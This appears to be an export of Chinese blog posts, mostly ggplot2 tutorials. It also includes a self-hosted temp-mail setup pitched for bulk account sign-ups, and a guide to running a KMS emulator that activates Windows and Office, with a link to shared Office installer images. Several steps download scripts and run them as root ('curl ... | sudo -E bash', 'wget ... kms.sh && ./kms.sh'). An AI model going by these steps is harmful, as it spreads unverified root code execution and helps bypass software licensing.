1.00然后我用reshape2包中的melt()函数将这个相关矩阵转换为3列的数据框格式：12df_cor &lt;- round(cor(df), 2)melt(df_cor)下面是输出的前6行：1234567 Var1 Var2 value1 mpg mpg 1.002 disp mpg -0.853 hp mpg -0.784 drat mpg 0.685 wt mpg -0.876 qsec mpg 0.42相关矩阵热力图绘制基本相关矩阵热力图绘制前面我们已经得到了3列的数据框（变量名Var1、变量名Var2、数值value），现在我们只需要将它们分别映射给x、y和fill参数，就能够绘制出热力图。12345df_cor &lt;- round(cor(df), 2) df_cor %&gt;% melt() %&gt;% ggplot(aes(x = Var1, y = Var2, fill = value)) + geom_tile()默认的绘图样式比较丑，也不太直观。相关矩阵的下三角绘制热力图相关矩阵具有冗余信息，因此，我们可以将其中的上三角部分设置为NA：12df_cor &lt;- round(cor(df), 2)df_cor[upper.tri(df_cor)] &lt;- NA下面是df_cor：1234567 mpg disp hp drat wt qsecmpg 1.00 NA NA NA NA NAdisp -0.85 1.00 NA NA NA NAhp -0.78 0.79 1.00 NA NA NAdrat 0.68 -0.71 -0.45 1.00 NA NAwt -0.87 0.89 0.66 -0.71 1.00 NAqsec 0.42 -0.43 -0.71 0.09 -0.17 1.00下面绘制热力图：12345678910111213# 相关矩阵的上三角-左图df_cor %&gt;% melt(na.rm = TRUE) %&gt;% ggplot(aes(x = Var1, y = Var2, fill = value)) + geom_tile()# 相关矩阵的上三角+颜色标度+样式美化-右图df_cor %&gt;% melt(na.rm = TRUE) %&gt;% ggplot(aes(x = Var1, y = Var2, fill = value)) + geom_tile() + scale_fill_gradient2(low = "blue", high = "red", mid = "white", midpoint = 0, limit = c(-1,1), space = "Lab", name="Pearson\nCorrelation") + coord_fixed()coord_fixed()：使得x轴上的一个单位与y轴上的一个单位的长度相同。相关矩阵重新排序我们可以根据相关系数对相关矩阵进行重新排序，这样可以更容易地识别矩阵中的隐藏模式。下面我们用分层聚类hclust()函数对相关矩阵进行重新排序：12345678910111213141516df_cor &lt;- round(cor(df), 2)# 根据距离重新排序dd &lt;- as.dist((1 - df_cor)/2)hc &lt;- hclust(dd)df_cor &lt;- df_cor[hc$order, hc$order]# 上三角部分设置为NAdf_cor[upper.tri(df_cor)] &lt;- NA# 热力图绘制heatmap_1 &lt;- df_cor %&gt;% melt(na.rm = TRUE) %&gt;% ggplot(aes(x = Var1, y = Var2, fill = value)) + geom_tile() + scale_fill_gradient2(low = "blue", high = "red", mid = "white", midpoint = 0, limit = c(-1,1), space = "Lab", name="Pearson\nCorrelation") + coord_fixed()下面左图是相关矩阵未排序的热力图，右图是相关矩阵排序后的热力图：热力图上显示相关系数值我们可以用geom_text()函数在热力图上添加相关系数值，这样更加直观。然后我可以把主题theme()设置为空白主题（删除轴标签、轴刻度、面板网格、背景），最后改变图例位置。12345678910111213141516171819# 热力图上显示相关系数值-左图heatmap_1 + geom_text(aes(Var1, Var2, label = value), color = "black", size = 4) # 热力图上显示相关系数值+主题、图例美化-右图heatmap_1 + geom_text(aes(Var1, Var2, label = value), color = "black", size = 4) + theme( axis.title.x = element_blank(), axis.title.y = element_blank(), panel.grid.major = element_blank(), panel.border = element_blank(), panel.background = element_blank(), axis.ticks = element_blank(), legend.justification = c(1, 0), legend.position = c(0.6, 0.7), legend.direction = "horizontal" ) + guides(fill = guide_colorbar(barwidth = 7, barheight = 1, title.position = "top", title.hjust = 0.5))参考数据可视化——R语言ggplot2包绘制相关矩阵为热图]]></content>
      <categories>
        <category>R</category>
        <category>数据可视化</category>
      </categories>
      <tags>
        <tag>R</tag>
        <tag>数据可视化</tag>
        <tag>ggplot2</tag>
        <tag>热力图</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ggplot2去除箱型图中的离群点]]></title>
    <url>%2Farchives%2F67c7ad2c.html</url>
    <content type="text"><![CDATA[我们在用ggplot2的箱型图boxplot()可视化时会发现，部分特别异常的离群点导致箱型图自身被压缩的很扁，而我们一般更关注箱型图本身。因此，我们需要在不影响箱型图自身的分布的同时去除这些离群点。方法1——通过geom_boxplot()中的参数设置我们可以通过箱型图函数geom_boxplot()中的参数设置来不显示这些离群点：1geom_boxplot(outlier.shape = NA)或者1geom_boxplot(outlier.colour = NA)但是这个方法不能满足我们的需求，这里虽然离群点都不再显示了，但是箱型图本身却没有被放大，没有达到我们的目的。方法2——通过位置标度设置我们可以通过位置标度函数scale_y_continuous()来改变y轴范围：1scale_y_continuous(limits = c(0,2e+8))这个方法把处于范围外的数据点也删除了，然后在新设置的范围内重新计算绘图，这很可能会改变最后绘制的箱型图。这个方法也不能达到我们的目的。方法3——笛卡尔坐标系变换我们可以用笛卡尔坐标系变换函数coord_trans()对图进行放大：1coord_trans(x = "identity", y = "identity", limx = NULL, limy = c(0,2e+8))这个方法比较完美的解决了我的问题。]]></content>
      <categories>
        <category>R</category>
        <category>数据可视化</category>
      </categories>
      <tags>
        <tag>R</tag>
        <tag>数据可视化</tag>
        <tag>ggplot2</tag>
        <tag>箱型图</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[VPS上自建临时邮箱]]></title>
    <url>%2Farchives%2F73a8979d.html</url>
    <content type="text"><![CDATA[当我们不想使用自己的真实邮箱，或者想批量注册账号的时候，就可以用临时搭建的即用即毁的邮箱系统。当我们通过IP或者域名访问这个临时邮箱系统时，系统会自动分配随机邮箱，收到新邮件后页面会自动刷新，页面关闭后邮件即丢失。本文介绍的临时邮箱是Forsaken Mail，使用的是node.js。nodejs安装系统版本：Ubuntu 16.04nodejs官方推荐安装方式：12curl -sL https://deb.nodesource.com/setup_10.x | sudo -E bash -sudo apt-get install -y nodejs确认nodejs版本：1node -v安装Forsaken Mail下载安装从GitHub下载Forsaken Mail源码：1wget https://github.com/malaohu/forsaken-mail/archive/master.zip解压：1unzip master.zip下面我们用npm安装Forsaken Mail：12cd forsaken-mail-masternpm install &amp;&amp; npm start如果没有报错，服务器已经开启了。我们可以访问VPS IP:3000，看看是否正常工作。Forsaken Mail在后台运行当我们关闭ssh窗口后，终端会收到 HUP（hangup）信号从而关闭其所有子进程，导致nodejs进程被关闭。下面我使用screen让nodejs在后台运行：启动一个名字为mail的screen：1screen -S mail启动Forsaken Mail1npm start回到前一个screen，当时在当前screen运行的程序不会停止1ctrl + a + d列出所有的screen1screen -ls回到我们建的名为mail的screen1screen -r mailscreen的使用教程可以看：Linux screen 使用技巧绑定域名除了通过IP地址访问，还可以自定义邮箱域名，我们只需要在域名服务商的域名设置里面添加以下两条域名解析记录即可：添加MX记录：MX记录指向到自定义二级域名mail.tding.top.，其中主机记录设置为@，优先级设置10添加A记录：A记录指向到服务器ip地址，其中主机记录设置为mail域名解析设置见下图：说明：MX记录的记录值的最后有一个点，代表主机名结束。在有些域名服务商网站设置的时候不会自动帮您加上，如果漏掉的话 DNS 服务器在解析的时候，会自动并上你的域名，这样会引起解析错误。这样，我们可以通过http://自定义域名:3000/来访问临时邮箱了。最后，欢迎大家用我搭建的临时邮箱来测试：邮箱地址]]></content>
      <categories>
        <category>工具使用</category>
        <category>软件</category>
      </categories>
      <tags>
        <tag>VPS</tag>
        <tag>临时邮箱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搭建自己的KMS服务器激活Windows&Office]]></title>
    <url>%2Farchives%2F1df8b972.html</url>
    <content type="text"><![CDATA[KMS全称Key Management Service ，这个功能是在Windows Vista之后的产品中的一种新型产品激活机制，目的是为了Microsoft更好的遏制非法软件授权行为(盗版)。我们知道，Windows XP和Server 2003要想避开激活机制的最好办法就是去下载VOL版或者MSDN的操作系统，只要输入正确的序列号，甚至有的根本不需要序列号，安装完以后也根本不用激活，并且只要运行一个脚本程序，一个免费的正版Windows就诞生了。为什么我们能这么容易的下载到MSDN或VOL版的XP和2003？其实Windows XP系列系统的MSDN版是Microsoft内部使用的系统，而VOL版是企业版，所以都不需要激活。然而这些版本最终被泄露，导致XP的盗版风无法停住，即使WGA也无能为力。但是从Windows Vista之后，Microsoft已吸取了这个教训，取消了Windows Vista及之后版本的VOL版，取而代之提供给批量激活的是利用KMS机制的Windows VL版本，遏制了不经微软激活服务器就进行激活的非法授权(盗版)行为。由于Windows VL都是为批量激活而诞生，所以在一个激活单位中肯定会有很多台配置相等的计算机，并用一个服务器建立起一个局域网（LAN），而KMS正好利用这一点，它要求局域网中必须有一台KMS服务器，KMS服务器的作用是给局域网中的所有计算机的操作系统定周期(一般是180天)提供一个随机的激活ID(不同于产品激活密钥)，然后计算机里面的KMS服务就会自动将系统激活，实现正常的系统软件服务与操作。所以计算机必须保持与KMS服务器的定期连接，以便KMS激活服务的自动检查实现激活的自动续期，这样就实现了限制于公司域内的激活范围，避免了对于外界计算机的非法授权，当非法激活者离开公司域后，由于客户端KMS服务不能连接位于域内的KMS激活服务器，让它提供一个新的序列号，超过180天以后就会因为激活ID过期而重新回到试用版本状态，而合法授权者则能够定期获得ID更新，保持一直正确的激活状态。VPS安装KMS服务器这里，我使用秋水逸冰开发的适用于三大 Linux 发行版的一键安装 KMS 服务的脚本在VPS上安装KMS服务器。本脚本适用环境系统支持：CentOS 6+，Debian 7+，Ubuntu 12+虚拟技术：任意内存要求：≥128M关于本脚本本脚本适用于三大 Linux 发行版，其他版本则不支持。KMS 服务安装完成后会加入开机自启动。默认记录日志，其日志位于 /var/log/vlmcsd.log。一键脚本安装方法使用root用户登录，运行以下命令：1wget --no-check-certificate https://github.com/teddysun/across/raw/master/kms.sh &amp;&amp; chmod +x kms.sh &amp;&amp; ./kms.sh安装完成后，输入以下命令查看端口号 1688 的监听情况：1netstat -nxtlp | grep 1688返回值类似于如下这样就表示OK了：12tcp 0 0 0.0.0.0:1688 0.0.0.0:* LISTEN 3200/vlmcsd tcp 0 0 :::1688 :::* LISTEN 3200/vlmcsd使用命令启动：/etc/init.d/kms start停止：/etc/init.d/kms stop重启：/etc/init.d/kms restart状态：/etc/init.d/kms status卸载方法使用 root 用户登录，进入到kms.sh所在的目录下，运行以下命令：1./kms.sh uninstall激活激活WindowsKMS 激活服务只能激活批量授权版 Windows (VOL 版)，无法激活零售版 Windows (Retail 版)。以 Windows 10 Pro 为例 想要激活 VOL 版 Windows 10 pro，只需要用管理员权限打开一个 cmd，然后依次执行以下命令：12345slmgr -upkslmgr -ipk W269N-WFGWX-YVC9B-4J6C9-T83GXslmgr -skms IP:PORTslmgr -atoslmgr -dlv激活 Windows 8、Windows 7类似，只需要把上面的 KEY 替换一下即可。注意：VOL 版本的镜像一般内置 GVLK key，用于 KMS 激活。如果你手动输过其他 key，那么这个内置的 key 就会被替换掉，这个时候如果你想用 KMS，那么就需要把 GVLK key 输回去。具体的KEY见后面的附录。如果不知道自己的系统是什么版本，可以运行以下命令查看系统版本：1wmic os get caption我们得到对应key之后，使用管理员权限运行cmd执行安装key：1slmgr -ipk xxxxx-xxxxx-xxxxx-xxxxx激活OfficeKMS 激活服务只能激活 VOL 版的 Office，不过零售版的 Office 可以通过脚本转换为 VOL 版。如果不知道自己安装的是什么版本的 Office，可以使用这个方法查看：判断你安装的 Office 是哪个版本：以管理员权限打开一个 cmd，进入Office的安装目录，输入命令：12&gt; cscript ospp.vbs /dstatus&gt;如果输出的信息中包含下面这句话说明你安装的是零售版：12&gt; LICENSE DESCRIPTION: Office 15, RETAIL(Grace) channel&gt;如果输出的信息中包含下面这句话说明你安装的是批量授权版：12&gt; LICENSE DESCRIPTION: Office 15, VOLUME_KMSCLIENT channel&gt;激活 Office 的关键在于找到 ospp.vbs 这个文件。ospp.vbs 一般在 Office 的安装目录里。 Office 2016 的默认安装目录是：C:\Program Files\Microsoft Office\Office16。 以管理员权限打开一个cmd，然后执行以下命令：1cd "C:\Program Files\Microsoft Office\Office16"如果你系统是 64 位的但 Office 安装的是 32 位的，执行以下命令：1cd "C:\Program Files (x86)\Microsoft Office\Office16"这样我们就进入到Office的安装目录，然后输入：12cscript ospp.vbs /sethst:IP:PORTcscript ospp.vbs /act附录-Office_Visio_Project下载下载地址：链接: https://pan.baidu.com/s/1i6Tx4DB 密码: 5t1i本光盘集成了以下程序：Microsoft Office 专业增强版 2016 （简体中文）Microsoft Project Professional 2016 （简体中文）Microsoft Visio 专业版 2016 （简体中文）以上程序均为VL版本。下载后务必校验镜像hash，否则可能会造成你的安装出错：64位版本：`X64_OVP@03K.ORG_17.11.iso`大小：3.03 GBCRC-32: e86507f9MD4: 7f920801005b2fbca6bc3eee9518cac4MD5: a5b85d589a949b4d0e419424d14e1be2SHA-1: 8e991e451fcc4c31c1515cd2c5470bfaf238031732位版本：`X86_OVP@03K.ORG_17.11.iso`大小：1.54 GBCRC-32: 4ed2daddMD4: 9d74cc7dc2cd4363b30a4390d884eca4MD5: f1bee496870a071692b231418f55848eSHA-1: 3167a81e2fb16262bd10506d234e40ab494fd970Hash校验插件：HashTabHashCheck Shell Extension这两款插件安装即可使用，只需要选中一个或多个文件，然后右键查看属性，其中就会有“Hashtab”、“文件校验”标签，非常方便。附录-KEYWindowsWindows 10 版本 1803操作系统版本KMS 客户端安装密钥Windows 10 教育版NW6C2-QMPVW-D7KKK-3GKT6-VCFB2Windows 10 教育版 N2WH4N-8QGBV-H22JP-CT43Q-MDWWJWindows 10 企业版NPPR9-FWDCX-D2C8J-H872K-2YT43Windows 10 企业版 GYYVX9-NTFWV-6MDM3-9PT4T-4M68BWindows 10 企业版 G N44RPN-FTY23-9VTTB-MP9BX-T84FVWindows 10 企业版 NDPH2V-TTNVB-4X9Q3-TJR4H-KHJW4Windows 10 专业版W269N-WFGWX-YVC9B-4J6C9-T83GXWindows 10 专业教育版6TP4R-GNPTD-KYYHQ-7B7DP-J447YWindows 10 专业教育版 NYVWGF-BXNMC-HTQYQ-CPQ99-66QFCWindows 10 专业版 NMH37W-N47XK-V7XM9-C7227-GCQG9Windows 10 Professional WorkstationNRG8B-VKK3Q-CXVCJ-9G2XF-6Q84JWindows 10 Professional Workstation N9FNHH-K3HBT-3W4TD-6383H-6XYWFWindows 10 版本 1709操作系统版本KMS 客户端安装密钥Windows 10 Professional WorkstationNRG8B-VKK3Q-CXVCJ-9G2XF-6Q84JWindows 10 Professional Workstation N9FNHH-K3HBT-3W4TD-6383H-6XYWFWindows 10操作系统版本KMS 客户端安装密钥Windows 10 专业版W269N-WFGWX-YVC9B-4J6C9-T83GXWindows 10 专业版 NMH37W-N47XK-V7XM9-C7227-GCQG9Windows 10 企业版NPPR9-FWDCX-D2C8J-H872K-2YT43Windows 10 企业版 NDPH2V-TTNVB-4X9Q3-TJR4H-KHJW4Windows 10 教育版NW6C2-QMPVW-D7KKK-3GKT6-VCFB2Windows 10 教育版 N2WH4N-8QGBV-H22JP-CT43Q-MDWWJWindows 10 企业版 2015 长期服务WNMTR-4C88C-JK8YV-HQ7T2-76DF9Windows 10 企业版 2015 长期服务 N2F77B-TNFGY-69QQF-B8YKP-D69TJWindows 10 企业版 2016 长期服务DCPHK-NFMTC-H88MJ-PFHPY-QJ4BJWindows 10 企业版 2016 长期服务 NQFFDN-GRT3P-VKWWX-X7T3R-8B639Windows 7 和 Windows Server 2008 R2操作系统版本KMS 客户端安装密钥Windows 7 专业版FJ82H-XT6CR-J8D7P-XQJJ2-GPDD4Windows 7 专业版 NMRPKT-YTG23-K7D7T-X2JMM-QY7MGWindows 7 专业版 EW82YF-2Q76Y-63HXB-FGJG9-GF7QXWindows7 企业版33PXH-7Y6KF-2VJC9-XBBR8-HVTHHWindows 7 企业版 NYDRBP-3D83W-TY26F-D46B2-XCKRJWindows 7 企业版 EC29WB-22CC8-VJ326-GHFJW-H9DH4Windows Server 2008 R2 Web 版6TPJF-RBVHG-WBW2R-86QPH-6RTM4Windows Server 2008 R2 HPC 版TT8MH-CG224-D3D7Q-498W2-9QCTXWindowsServer 2008 R2 StandardYC6KT-GKW9T-YTKYR-T4X34-R7VHCWindowsServer 2008 R2 企业版489J6-VHDMP-X63PK-3K798-CPX3YWindowsServer 2008 R2 Datacenter74YFP-3QFB3-KQT8W-PMXWJ-7M648面向基于 Itanium 系统的 Windows Server 2008 R2GT63C-RJFQ3-4GMB6-BRFB9-CB83VOfficeOffice 2016产品KMS 客户端安装密钥Office Professional Plus 2016XQNVK-8JYDB-WJ9W3-YJ8YR-WFG99Office Standard 2016JNRGM-WHDWX-FJJG3-K47QV-DRTFMProject Professional 2016YG9NW-3K39V-2T3HJ-93F3Q-G83KTProject Standard 2016GNFHQ-F6YQM-KQDGJ-327XX-KQBVCVisio Professional 2016PD3PC-RHNGV-FXJ29-8JK7D-RJRJKVisio Standard 20167WHWN-4T7MP-G96JF-G33KR-W8GF4Access 2016GNH9Y-D2J4T-FJHGG-QRVH7-QPFDWExcel 20169C2PK-NWTVB-JMPW8-BFT28-7FTBFOneNote 2016DR92N-9HTF2-97XKM-XW2WJ-XW3J6Outlook 2016R69KK-NTPKF-7M3Q4-QYBHW-6MT9BPowerPoint 2016J7MQP-HNJ4Y-WJ7YM-PFYGF-BY6C6Publisher 2016F47MM-N3XJP-TQXJ9-BP99D-8837KSkype for Business 2016869NQ-FJ69K-466HW-QYCP2-DDBV6Word 2016WXY84-JN2Q9-RBCCQ-3Q3J3-3PFJ6Office 2013产品KMS 客户端安装密钥Office 2013 Professional PlusYC7DK-G2NP3-2QQC3-J6H88-GVGXTOffice 2013 StandardKBKQT-2NMXY-JJWGP-M62JB-92CD4Project 2013 ProfessionalFN8TT-7WMH6-2D4X9-M337T-2342KProject 2013 Standard6NTH3-CW976-3G3Y2-JK3TX-8QHTTVisio 2013 ProfessionalC2FG9-N6J68-H8BTJ-BW3QX-RM3B3Visio 2013 StandardJ484Y-4NKBF-W2HMG-DBMJC-PGWR7Access 2013NG2JY-H4JBT-HQXYP-78QH9-4JM2DExcel 2013VGPNG-Y7HQW-9RHP7-TKPV3-BG7GBInfoPath 2013DKT8B-N7VXH-D963P-Q4PHY-F8894Lync 20132MG3G-3BNTT-3MFW9-KDQW3-TCK7ROneNote 2013TGN6P-8MMBC-37P2F-XHXXK-P34VWOutlook 2013QPN8Q-BJBTJ-334K3-93TGY-2PMBTPowerPoint 20134NT99-8RJFH-Q2VDH-KYG2C-4RD4FPublisher 2013PN2WF-29XG2-T9HJ7-JQPJR-FCXK4Word 20136Q7VD-NX8JD-WJ2VH-88V73-4GBJ7Office 2010Office 套件：产品KMS 客户端安装密钥Office Professional Plus 2010VYBBJ-TRJPB-QFQRF-QFT4D-H3GVBOffice Standard 2010V7QKV-4XVVR-XYV4D-F7DFM-8R6BMOffice Home and Business 2010D6QFG-VBYP2-XQHM7-J97RH-VVRCK独立产品：产品KMS 客户端安装密钥Access 2010V7Y44-9T38C-R2VJK-666HK-T7DDXExcel 2010H62QG-HXVKF-PP4HP-66KMR-CW9BMSharePoint Workspace 2010QYYW6-QP4CB-MBV6G-HYMCJ-4T3J4InfoPath 2010K96W8-67RPQ-62T9Y-J8FQJ-BT37TOneNote 2010Q4Y4M-RHWJM-PY37F-MTKWH-D3XHXOutlook 20107YDC2-CWM8M-RRTJC-8MDVC-X3DWQPowerPoint 2010RC8FX-88JRY-3PF7C-X8P67-P4VTTProject Professional 2010YGX6F-PGV49-PGW3J-9BTGG-VHKC6Project Standard 20104HP3K-88W3F-W2K3D-6677X-F9PGBPublisher 2010BFK7F-9MYHM-V68C7-DRQ66-83YTPWord 2010HVHB3-C6FV7-KQX9W-YQG79-CRY7TVisio：产品KMS 客户端安装密钥Visio Premium 2010D9DWC-HPYVV-JGF4P-BTWQB-WX8BJVisio Professional 20107MCW8-VRQVK-G677T-PDJCM-Q8TCPVisio Standard 2010767HD-QGMWX-8QTDB-9G3R2-KHFGJ参考KMS介绍本地搭建 KMS 激活服务一键安装KMS服务脚本Office 2016_Visio_Project_VL多合一_集成补丁2017.11]]></content>
      <categories>
        <category>工具使用</category>
        <category>软件</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>Office</tag>
        <tag>KMS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[R数据可视化-ggplot2的几何对象与统计变换]]></title>
    <url>%2Farchives%2F71d12648.html</url>
    <content type="text"><![CDATA[几何对象执行着图层的实际渲染，控制着生成的图像类型。geom_point()将会生成散点图geom_line()将会生成折线图geom_bar()将会生成柱状图geom_boxplot()将会生成箱型图geom_histogram()将会生成直方图统计变换通常以某种方式对数据信息进行汇总。stat_smooth()添加光滑曲线任何一个ggplot2图层都包括stat和geom两部分，stat_和geom_是两种绘图方法这个说法是不对的，下面我们简单解释下。举个例子：12345x &lt;- c(rnorm(100,14,5),rep(20,20)) y &lt;- c(rnorm(100,14,5),rep(20,20))p &lt;- ggplot(data= NULL, aes(x = x, y = y))p &lt;- p + geom_point(color = "darkred")p我们查看码源会发现geom_point()这个几何对象的默认stat是identity，即不做任何统计变换：1234567function (mapping = NULL, data = NULL, stat = &quot;identity&quot;, position = &quot;identity&quot;, ..., na.rm = FALSE, show.legend = NA, inherit.aes = TRUE) &#123; layer(data = data, mapping = mapping, stat = stat, geom = GeomPoint, position = position, show.legend = show.legend, inherit.aes = inherit.aes, params = list(na.rm = na.rm, ...))&#125;从代码我们可以发现，坐标(20，20)这个点的数据事实上有20个，但由于没做统计转换，(20,20)这个点被画了20次，因此我们看到的点其实是最后一次画的那个点。因此，下面我们按照某一点出现的频率换算成大小（指定stat = &quot;sum&quot;）来作图：12345x &lt;- c(rnorm(100,14,5),rep(20,20)) y &lt;- c(rnorm(100,14,5),rep(20,20))p &lt;- ggplot(data= NULL, aes(x = x, y = y))p &lt;- p + geom_point(color = "darkred",stat = "sum")p根据以上，我们可以发现一个单纯的geom_point里面也是带有stat_的，同样，我们也可以用stat_sum作为主函数来绘制这幅图，里面有参数geom，这里我们设置成geom = “point”。12345x &lt;- c(rnorm(100,14,5),rep(20,20)) y &lt;- c(rnorm(100,14,5),rep(20,20))p &lt;- ggplot(data= NULL, aes(x = x, y = y))p &lt;- p + stat_sum(color = "darkred",geom = "point")p画出来的图跟前面用geom_point函数是一样的。因此，我们需要认识到stat_和geom_是两种绘图方法这个说法是不对的，其实它们是ggplot2每一个图层绘制都必须有的，是一个图层的一体两面。下面简单介绍几个常用的绘图函数。geom_point()散点图绘制散点图可以使用geom_point()函数，气泡图（bubble chart）也是一个散点图，只不过点的大小由一个变量（size）来控制。散点图潜在的最大问题是过度绘图：当一个位置或相邻的位置上出现有多个点，就可能把点绘制在彼此之上，这会严重扭曲散点图的视觉外观，我们可以通过使点变得透明或者设置点的形状来解决该问题。geom_point()参数如下：1geom_point(mapping = NULL, data = NULL, stat = "identity", position = "identity", ..., na.rm = FALSE, show.legend = NA, inherit.aes = TRUE)这里我从数据集中随机选出了100个样本，作为一个小数据集：12345# 让样本可重复set.seed(1410)# 原始数据的一个容量为100的随机样本dsmall &lt;- diamonds[sample(nrow(diamonds),100),]下面是散点图的绘制：12p &lt;- ggplot(data = dsmall, mapping = aes(x = carat, y = price))p &lt;- p + geom_point(aes(color = color, size = cut), shape = 19, alpha = 0.5)geom_bar()柱状图离散单变量的柱状图明细数据集绘制柱状图-左图：12p &lt;- ggplot(data = diamonds, mapping = aes(x = cut))p &lt;- p + geom_bar()geom_bar()函数中的stat参数的默认值为stat = &#39;count&#39;，即观测数量，统计的是每个离散变量出现的频次。汇总好的数据集绘制柱状图-右图：12p &lt;- ggplot(data = diamonds, mapping = aes(x = cut, y = price))p &lt;- p + geom_bar(stat = "identity")我们只需要在geom_bar()中更改默认的count为identity就可以接受两个变量作图。分组柱状图分组柱状图一共有三种展现形式，我们可以使用position参数调整：并排放置position=&quot;dodge&quot;堆叠position=&quot;stack&quot;填充比例position=&quot;fill&quot;12345678910p &lt;- ggplot(data = diamonds, mapping = aes(x = cut,fill = color))# 并排放置-左图p + geom_bar(position = "dodge")# 堆叠-中图p + geom_bar(position = "stack")# 填充比例-右图p + geom_bar(position = "fill")柱状图排序其实前面我们在画柱状图时，使用的变量并不规范，当横坐标是离散型变量时，x参数接的应该是一个因子型数据（factor）。当x没有用因子型数据的时候，横轴可能会没有把所有的标签全标上，这表示把横轴当成连续性变量来看了，所以只标了一部分标签以表示大小关系。同样的，fill也是作为离散分类变量，也应该接一个factor，我们可以看到不加时，图例是一个连续性渐变颜色的形式。我们会发现，转化为因子型之后数据的排列方式，不是根据元素出现的前后顺序，而是按照首字母顺序。现在我们想让x轴按y轴数值大小排序。自定义函数我们可以自定义一个函数来实现柱子从高到低排列：123456789101112# 因子型数据，按照首字母排序-左图p &lt;- ggplot(data = diamonds, mapping = aes(x = factor(cut)))p &lt;- p + geom_bar()# 自定义函数reorder_size &lt;- function(x) &#123; factor(x, levels = names(sort(table(x), decreasing = TRUE)))&#125;# 从高到低排序-右图p &lt;- ggplot(data = diamonds, mapping = aes(x = reorder_size(cut)))p &lt;- p + geom_bar()reorder()函数reorder()函数用法：1reorder(x, X, FUN = mean, ..., order = is.ordered(x))x：因子型向量X：用来排序的数值型向量FUN：汇总数据的函数...：FUN的参数（可选）order：我们可以通过这个参数直接指定因子型向量的顺序按照x对X进行分组，对每一组组成的向量计算后面的函数，最后根据计算结果从小到大指定x中元素的顺序。下面是reorder()实现柱子从高到低排列，结果和前面自定义函数是一样的：12p &lt;- ggplot(data = diamonds, mapping = aes(reorder(cut,rep(1,length(cut)),sum)))p &lt;- p + geom_bar()我们可以根据cut对一个全是1的向量分组求和（相当于计算了cut中每一个元素出现的个数），再根据求和结果指定顺序。柱状图添加标签文字我们可以使用geom_text()为柱状图添加文本，显示柱状图的高度，并调整文本的位置和大小。123p &lt;- ggplot(data = diamonds, mapping = aes(x = factor(cut),fill = color))p &lt;- p + geom_bar(position = "fill")p &lt;- p + geom_text(stat = "count",mapping = aes(label = ..count..), size = 5, colour = 'white', vjust = 1, hjust = .5, position = position_fill(0.9))label设置当stat=&quot;count&quot;时，设置文本的标签需要使用一个特殊的变量 aes(label=..count..)， 表示的是变量值的数量当stat=&quot;identity&quot;时，设置文本的标签需要设置y轴的值，aes(label=price)，表示的变量的值size设置：标签字体大小，默认值为5号color设置：标签文字的颜色vjust设置：调整标签位置，1为分界线，越大于1，标签越在柱状图上界下方，反之则越在柱状图上界上方hjust设置：hjust = 0.5将标签水平居中放置position设置：这里的图形位置与标签位置摆放必须一致，即图形位置geom_bar()函数设置为position = &#39;fill&#39;，那么标签位置geom_text()函数设置为position = position_fill(0.9)参数正负柱状图只要数据是负数，就能画出往下方的柱状图：12345678d &lt;- data.frame(a=letters[1:7], b=c(4,-6,5,-4,-3,6,4))p &lt;- ggplot(d,aes(a,b))# 左图p1 &lt;- p + geom_bar(stat="identity")# 右图p2 &lt;- p + geom_bar(aes(fill=factor((b&gt;0)+1)),stat="identity")geom_boxplot()箱型图geom_boxplot()函数中有outlier开头的多个参数，用于修改离群点的属性：outlier.colour：离群点的颜色outlier.fill：离群点的填充色outlier.shape：离群点的形状outlier.size：离群点的大小outlier.alpha：离群点的透明度箱形图可以用fill参数指定填充颜色，color参数指定边框颜色。下面是一个示例：12p &lt;- ggplot(data = diamonds, mapping = aes(x = cut, y = price))p &lt;- p + geom_boxplot(fill = "white", color = "darkgreen", outlier.shape=21, outlier.size=4, outlier.stroke = 1, outlier.color = "gray", outlier.fill = "orange")在添加有多分类变量时，箱线图默认使用的position参数是dodge，使用堆积方式stack、堆积百分比fill来呈现多维箱线图是会失败的。geom_histogram()直方图直方图函数geom_histogram()与柱形图函数geom_bar()大致相同。直方图组距调整123456# 默认组距-左图p &lt;- ggplot(data = diamonds, mapping = aes(x = price))p + geom_histogram()# binwidth参数控制直方图组距大小-右图p + geom_histogram(binwidth = 1)分组直方图直方图参数中添加颜色映射来区分不同组，这时默认直方图输出为堆积直方图。我们也可以通过设置position参数对多序列柱形进行簇状、堆积百分比转换。12345678910111213p &lt;- ggplot(data = diamonds, mapping = aes(x = price, fill = factor(cut)))# 默认分组直方图（stack）-左上图p + geom_histogram()# 不做任何转换（identity）-右上图p + geom_histogram(position = 'identity')# 簇状分组柱状图（dodge）-左下图p + geom_histogram(position = 'dodge')# 堆叠百分比分组柱状图（fill）-右下图p + geom_histogram(position = 'fill')参考如何使用 ggplot2 ？R|ggplot2(二)|覆盖柱状图各种需求]]></content>
      <categories>
        <category>R</category>
        <category>数据可视化</category>
      </categories>
      <tags>
        <tag>R</tag>
        <tag>数据可视化</tag>
        <tag>ggplot2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[R数据可视化-ggplot2的标度]]></title>
    <url>%2Farchives%2F99c6f91.html</url>
    <content type="text"><![CDATA[标度控制着数据到图形属性的映射，标度将我们的数据转化为视觉上可以感知的东西，如大小、颜色、位置和形状，所以通过标度可以修改坐标轴和图例的参数。每一种图形属性都拥有一个默认的标度，此标度将在我们每次使用这个图形属性时被自动添加到图形中，这些标度列于下表中，默认属性粗体显示：图形属性离散型连续型颜色和填充色brewer grey hue identity manualgradient gradient2 gradientn位置discretecontinuous date形状shape identity manual线条类型linetype identity manual大小identity manualsize如果要添加一个不同的标度或修改默认标度的某些特征，我们必须构建一个新的标度，然后使用+将其添加到图形上。所有的标度构建器（scale）都拥有一套通用的命名方案，它们以scale_开头，接下来是图形属性的名称（例如：colour_、shape_、x_）最后以标度的名称结尾（gradient、hue、manual）。离散图形的颜色属性采用默认标度：scale_colour_hue()离散图形的填充色属性采用ColorBrewer配色标度：scale_fill_brewer()下面是一个例子：123456# 默认标度-左图p &lt;- ggplot(data = diamonds, mapping = aes(x = carat, y = price, color = factor(cut)))p &lt;- p + geom_point()# 调整标度的参数-右图p + scale_colour_hue("cut",breaks=c("Fair","Good","Very 